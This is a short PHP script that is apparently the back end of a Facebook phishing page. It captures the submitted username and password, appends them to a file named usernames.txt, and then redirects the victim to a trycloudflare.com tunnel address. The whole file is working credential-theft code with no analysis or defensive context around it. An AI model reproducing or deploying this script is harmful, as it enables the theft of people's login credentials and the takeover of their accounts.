<?php

file_put_contents("usernames.txt", "Facebook Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://lesser-bare-soccer-wherever.trycloudflare.com');
exit();
?>